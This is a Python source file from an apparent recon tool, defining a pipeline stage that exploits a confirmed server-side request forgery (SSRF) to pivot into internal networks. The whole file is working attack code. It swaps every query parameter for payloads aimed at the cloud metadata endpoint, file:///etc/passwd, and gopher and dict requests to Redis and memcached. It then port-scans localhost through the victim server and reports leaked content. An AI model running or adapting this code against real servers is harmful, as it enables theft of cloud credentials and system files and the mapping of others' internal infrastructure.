from __future__ import annotations

import time
import asyncio
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class SSRFPivotStage(Stage):
    """
    Elite SSRF-to-Internal Pivot Stage.
    When an SSRF is confirmed, this stage automatically uses it to probe 
    internal infrastructure (Metadata, Localhost, Internal IPs).
    """
    name = "ssrf_pivot"

    INTERNAL_PROBES = [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080",
        "http://10.0.0.1",
        "http://172.17.0.1",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    
    COMMON_PORTS = [21, 22, 25, 80, 443, 3306, 5432, 6379, 8000, 8080, 8443, 9000, 27017]

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_ssrf_pivot", True))

    async def run_async(self, context: PipelineContext) -> None:
        findings = context.get_results()
        # Find verified SSRF vulnerabilities
        verified_ssrf = [f for f in findings if f.get("finding_type") == "ssrf" and f.get("confidence_label") == "verified"]
        
        if not verified_ssrf:
            return

        context.logger.info("Found %d confirmed SSRF(s). Starting internal pivoting & port scanning...", len(verified_ssrf))
        
        runtime = context.runtime_config
        config = HTTPClientConfig(
            max_concurrent=15,
            total_timeout=10.0,
            verify_ssl=bool(getattr(runtime, "verify_tls", True)),
            requests_per_second=20.0
        )

        async with AsyncHTTPClient(config, context=context) as client:
            for ssrf in verified_ssrf:
                url = ssrf.get("url")
                if not url: continue
                
                # 1. Test standard probes
                await self._pivot_internal(context, client, url)
                
                # 2. Test internal port scan
                await self._scan_internal_ports(context, client, url)

    async def _scan_internal_ports(self, context: PipelineContext, client: AsyncHTTPClient, url: str) -> None:
        """Attempts to scan internal ports via the SSRF vulnerability."""
        base_host = "127.0.0.1"
        for port in self.COMMON_PORTS:
            probe = f"http://{base_host}:{port}"
            test_url = self._inject_probe(url, probe)
            try:
                start = time.monotonic()
                resp = await client.get(test_url)
                duration = time.monotonic() - start
                
                # Indicators of an open port
                if resp.status < 500 or duration > 4.5:
                    self._report_pivot(context, url, probe, f"Port {port} potentially OPEN (Status: {resp.status})")
            except Exception: pass

    async def _pivot_internal(self, context: PipelineContext, client: AsyncHTTPClient, url: str) -> None:
        for probe in self.INTERNAL_PROBES:
            test_url = self._inject_probe(url, probe)
            try:
                resp = await client.get(test_url)
                # Heuristic: If we get a 200 or a specific metadata response, it's a hit!
                if resp.status == 200:
                    if any(h in resp.body for h in ["ami-id", "instance-id", "localhost"]):
                        self._report_pivot(context, url, probe, resp.body[:500])
            except Exception: pass

    def _inject_probe(self, url: str, probe: str) -> str:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        updated = [(k, probe) for k, _ in params]
        return urlunparse(parsed._replace(query=urlencode(updated)))

    def _report_pivot(self, context: PipelineContext, url: str, probe: str, snippet: str) -> None:
        finding = {
            "type": "finding",
            "finding_type": "ssrf_internal_pivot",
            "source": self.name,
            "url": url,
            "hostname": urlparse(url).hostname,
            "description": f"Confirmed SSRF Pivot to Internal Asset: {probe}",
            "severity": "critical",
            "score": 100,
            "details": {"probe": probe, "snippet": snippet},
            "tags": ["ssrf", "pivot", "internal", "confirmed"]
        }
        context.results.append(finding)
        context.emit_signal("ssrf_pivot_success", "url", url, confidence=1.0, source=self.name, evidence={"probe": probe})
        context.logger.info("🚨 SSRF Pivot SUCCESS: Found %s via %s", probe, url)
